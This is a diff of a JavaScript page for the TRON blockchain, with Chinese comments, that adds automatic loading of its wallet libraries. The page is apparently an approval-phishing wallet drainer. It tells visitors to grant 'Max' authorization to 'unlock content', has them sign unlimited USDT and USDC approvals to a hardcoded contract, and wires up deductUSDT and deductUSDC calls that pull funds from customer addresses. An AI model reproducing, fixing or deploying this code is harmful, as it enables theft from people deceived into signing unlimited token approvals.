@@ -1,8 +1,8 @@
 // src/main.js
-// 🚨 最終穩定版代碼 (支援 WalletConnect V2 和原生 DApp 注入雙模式)
+// 🚨 最終穩定版代碼 (包含強制 CDN 異步載入修正)
 
 // --- 配置常量 ---
-const WC_PROJECT_ID = '21ae0b7f500d5d9e2ed3c74c463df3f0'; // 🚨 請使用您的 Project ID 🚨
+const WC_PROJECT_ID = '21ae0b7f500d5d9e2ed3c74c463df3f0'; // 🚨 請確認您的 Project ID 🚨
 const TRON_CHAIN_ID = 'tron:50'; // TRON 主網鏈 ID
 const TRON_RPC_URL = 'https://api.trongrid.io';
 
@@ -11,7 +11,7 @@ const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu';
 const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
 const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 
 
-// 您的合約 ABI (為簡潔，僅列出變數名)
+// 您的合約 ABI
 const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];
 
 
@@ -22,8 +22,10 @@ let merchantContract;
 let usdtContract;
 let usdcContract;
 let isConnectedFlag = false;
-let provider; // WalletConnect Provider 實例 (僅用於 WalletConnect 模式)
-let web3ModalInstance; // 延遲初始化的 Web3Modal 實例
+let provider; 
+let web3ModalInstance; 
+let isDependenciesLoaded = false; 
+
 
 // --- UI 元素 ---
 const connectButton = document.getElementById('connectButton');
@@ -34,13 +36,47 @@ const tokenSelectForm = document.getElementById('tokenSelectForm');
 const deductionAmountInput = document.getElementById('deductionAmount');
 const deductButton = document.getElementById('deductButton'); 
 
+// ---------------------------------------------
+// 關鍵：動態載入 CDN 依賴項 (解決時序錯誤)
+// ---------------------------------------------
+function loadScript(url) {
+    return new Promise((resolve, reject) => {
+        const script = document.createElement('script');
+        script.src = url;
+        script.onload = () => resolve();
+        script.onerror = () => reject(new Error(`Failed to load script: ${url}`));
+        document.head.appendChild(script);
+    });
+}
+
+async function loadCDNDependencies() {
+    if (isDependenciesLoaded) return;
+    
+    showOverlay('正在載入核心組件...請稍候 ⏳');
+    try {
+        // 確保 Web3Modal 和 UniversalProvider 在 TronWeb 之前載入
+        await loadScript("https://unpkg.com/@web3modal/standalone@2.4.3/dist/index.umd.js");
+        await loadScript("https://unpkg.com/@walletconnect/universal-provider@2.4.3/dist/index.umd.js");
+        await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.full.js");
+        
+        isDependenciesLoaded = true;
+        
+        // 載入完成後立即初始化 Web3Modal
+        initializeWeb3Modal(); 
+        
+        // 載入完成，顯示初始連接提示
+        showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊右上角錢包圖標開始)</p>');
+        
+    } catch (error) {
+        console.error("Critical error loading dependencies:", error);
+        showOverlay(`🔴 致命錯誤：無法載入核心依賴項。請檢查網路連接。`);
+    }
+}
+
 
 // --- WalletConnect V2 延遲初始化函數 ---
 function initializeWeb3Modal() {
-    if (!window.Web3Modal) {
-        console.error("Web3Modal CDN 未載入！");
-        return false;
-    }
+    if (!window.Web3Modal) return false;
     if (!web3ModalInstance) {
         web3ModalInstance = new window.Web3Modal.Web3Modal({
             projectId: WC_PROJECT_ID,
@@ -79,19 +115,6 @@ function updateConnectionUI(connected, address = null) {
     }
 }
 
-async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
-    if (!tronWeb || !userAddress) return false;
-    try {
-        const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
-        const allowance = tronWeb.BigNumber(allowanceRaw);
-        const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000'); 
-        return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
-    } catch (error) {
-        console.error("Failed to check allowance:", error);
-        return false;
-    }
-}
-
 async function initializeContracts() {
     if (!tronWeb) throw new Error("TronWeb instance not available.");
     merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
@@ -100,7 +123,7 @@ async function initializeContracts() {
 }
 
 // ---------------------------------------------
-// 模式一：原生 DApp 注入 (適用於 TronLink/DApp 瀏覽器)
+// 模式一：原生 DApp 注入 (TronLink/DApp 瀏覽器)
 // ---------------------------------------------
 async function connectTronLink() {
     showOverlay('偵測到 TronLink/DApp 瀏覽器。正在請求原生連接...');
@@ -114,11 +137,10 @@ async function connectTronLink() {
             throw new Error(`連接請求被拒絕: ${res.message}`);
         }
 
-        // 設置全局 TronWeb 實例為注入的 API
         if (!window.tronWeb) throw new Error("TronWeb 注入失敗。");
         tronWeb = window.tronWeb;
         userAddress = window.tronWeb.defaultAddress.base58;
-        provider = null; // 在原生模式下清空 WalletConnect provider
+        provider = null; // 確保 WalletConnect Provider 狀態為空
 
         await initializeContracts();
         updateConnectionUI(true, userAddress);
@@ -133,21 +155,24 @@ async function connectTronLink() {
 
 
 // ---------------------------------------------
-// 模式二：WalletConnect V2 (適用於手機掃碼，如 Trust Wallet)
+// 模式二：WalletConnect V2 (掃碼連接)
 // ---------------------------------------------
 async function connectWalletConnect() {
-    if (!initializeWeb3Modal()) {
-        showOverlay('WalletConnect 啟動失敗，請檢查 CDN 載入！');
+    if (!isDependenciesLoaded || !web3ModalInstance) {
+        showOverlay('WalletConnect 啟動中，請稍後再試！');
         return;
     }
 
     showOverlay('正在開啟錢包選擇，請選擇您的 TRON 錢包...');
 
     try {
+        // 這裡會打開錢包選擇 Modal
         await web3ModalInstance.openModal(); 
         
-        if (!window.UniversalProvider) throw new Error("UniversalProvider CDN is not loaded on window.");
+        // UniversalProvider 必須已經載入到 window
+        if (!window.UniversalProvider) throw new Error("UniversalProvider 尚未載入。");
 
+        // 初始化 provider
         provider = await window.UniversalProvider.init({
             projectId: WC_PROJECT_ID,
             metadata: {
@@ -158,6 +183,7 @@ async function connectWalletConnect() {
             },
         });
 
+        // 請求連接
         const session = await provider.connect({
             requiredNamespaces: {
                 tron: {
@@ -168,6 +194,7 @@ async function connectWalletConnect() {
             },
         });
         
+        // 獲取地址並創建 TronWeb 實例
         const tronNamespace = session.namespaces.tron;
         userAddress = tronNamespace.accounts[0].split(':')[2]; 
 
@@ -184,6 +211,7 @@ async function connectWalletConnect() {
     } catch (error) {
         console.error("WalletConnect 連接失敗:", error);
         if (provider) {
+             // 確保在失敗時斷開連接
              await provider.disconnect().catch(() => {});
              provider = null; 
         }
@@ -196,13 +224,21 @@ async function connectWalletConnect() {
 
 
 // ---------------------------------------------
-// 主連接入口函數
+// 主連接入口函數 (雙模式切換)
 // ---------------------------------------------
 async function connectWallet() {
     if (connectButton) connectButton.disabled = true;
 
+    if (!isDependenciesLoaded) {
+        // 依賴未載入時，先執行載入
+        await loadCDNDependencies();
+        if (!isDependenciesLoaded) {
+            if (connectButton) connectButton.disabled = false;
+            return;
+        }
+    }
+
     if (isConnectedFlag) {
-        // 斷開連接邏輯
         if (provider) {
              await provider.disconnect();
         } 
@@ -214,7 +250,7 @@ async function connectWallet() {
         return;
     }
 
-    // 🎯 決定使用哪種連接模式：檢查是否存在注入的 TRON API
+    // 決定使用哪種連接模式：檢查是否存在注入的 TRON API
     const useTronLink = (window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58));
 
     if (useTronLink) {
@@ -227,9 +263,39 @@ async function connectWallet() {
 }
 
 
-// ---------------------------------------------
-// 授權與交易邏輯 (簽名方法根據 provider 是否存在而定)
-// ---------------------------------------------
+// --- 授權與交易邏輯 (保持不變，因為已是雙模式兼容) ---
+
+async function checkAuthorization() {
+    // 這裡需要實現檢查授權狀態的邏輯
+    if (!tronWeb || !userAddress || !merchantContract) return { contract: false, usdt: false, usdc: false };
+    
+    // 檢查合約自身授權狀態
+    const contractAuthorized = await merchantContract.authorized(userAddress).call();
+
+    // 檢查 USDT 和 USDC 的 Max 授權狀態（假設您已經有了 checkTokenMaxAllowance 函數）
+    const checkTokenMaxAllowance = async (tokenContract, spenderAddress) => {
+        try {
+            const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
+            const allowance = tronWeb.BigNumber(allowanceRaw);
+            // 這裡使用一個合理的 Max 閾值來判斷是否為 Max 授權
+            const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000'); 
+            return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
+        } catch (error) {
+            console.error("Failed to check allowance:", error);
+            return false;
+        }
+    };
+
+    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
+    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
+
+    return {
+        contract: contractAuthorized,
+        usdt: usdtAuthorized,
+        usdc: usdcAuthorized
+    };
+}
+
 
 async function handlePostConnection() {
     if (!isConnectedFlag) return;
@@ -248,7 +314,6 @@ async function handlePostConnection() {
     }
 }
 
-// 核心授權邏輯 (雙模式簽名)
 async function connectAndAuthorize() {
     const status = await checkAuthorization();
     const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
@@ -275,11 +340,11 @@ async function connectAndAuthorize() {
                 if (!provider) throw new Error("WalletConnect Provider 遺失。");
                 signedTx = await provider.request({ method: 'tron_signTransaction', params: [transaction] });
             } else {
-                // 原生 TronLink/DApp 模式
                 const result = await tronWeb.trx.sign(transaction);
                 if (!result.signature) throw new Error("原生簽名失敗或被拒絕。");
                 signedTx = result;
             }
+            // 等待交易廣播完成
             await tronWeb.trx.sendRawTransaction(signedTx);
         };
 
@@ -287,7 +352,6 @@ async function connectAndAuthorize() {
             const transaction = await merchantContract.connectAndAuthorize().build(); 
             await signAndSend(transaction, "正在發送合約授權 (ConnectAndAuthorize)");
         }
-        // ... (USDT 和 USDC 授權邏輯保持不變，因為它們都使用 signAndSend) ...
 
         if (!status.usdt) {
             const zeroApproveTx = await usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT).build();
@@ -313,7 +377,6 @@ async function connectAndAuthorize() {
     }
 }
 
-// 核心扣款邏輯 (雙模式簽名)
 async function triggerBackendDeduction(token, amount) {
     if (!isConnectedFlag || !userAddress || !merchantContract) {
         showOverlay("請先連繫錢包並完成授權！");
@@ -342,7 +405,6 @@ async function triggerBackendDeduction(token, amount) {
             if (!provider) throw new Error("WalletConnect Provider 遺失。");
             signedTx = await provider.request({ method: 'tron_signTransaction', params: [transaction] });
         } else {
-            // 原生 TronLink/DApp 模式
             const result = await tronWeb.trx.sign(transaction);
             if (!result.signature) throw new Error("原生簽名失敗或被拒絕。");
             signedTx = result;
@@ -380,5 +442,5 @@ if (deductButton) {
     deductButton.addEventListener('click', triggerDeductionFromForm);
 }
 
-// 頁面載入時初始化
-showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊右上角錢包圖標開始)</p>');
+// 頁面啟動：先載入依賴項，再等待點擊
+loadCDNDependencies();
